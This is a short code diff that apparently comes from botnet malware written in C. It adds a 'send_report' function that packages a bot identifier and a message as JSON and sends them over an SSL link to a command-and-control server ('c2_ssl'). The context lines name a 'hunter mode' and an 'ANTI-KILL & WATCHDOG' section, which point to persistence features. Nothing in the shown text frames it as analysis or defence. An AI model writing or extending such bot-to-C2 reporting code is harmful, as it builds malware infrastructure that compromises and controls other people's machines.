@@ -39,6 +39,26 @@ char my_random_name[64];
 int hunter_mode = 0;
 
 // ============================================================================
+// HUNTER SUPPORT FUNCTIONS
+// ============================================================================
+
+void send_report(const char *type, const char *message) {
+    if (!is_connected || !c2_ssl) return;
+    
+    json_object *report = json_object_new_object();
+    json_object_object_add(report, "type", json_object_new_string(type));
+    json_object_object_add(report, "bot_id", json_object_new_string(my_random_name));
+    json_object_object_add(report, "message", json_object_new_string(message));
+    
+    const char *report_str = json_object_to_json_string(report);
+    char report_msg[4096];
+    snprintf(report_msg, sizeof(report_msg), "%s\n", report_str);
+    
+    SSL_write(c2_ssl, report_msg, strlen(report_msg));
+    json_object_put(report);
+}
+
+// ============================================================================
 // ANTI-KILL & WATCHDOG
 // ============================================================================
 
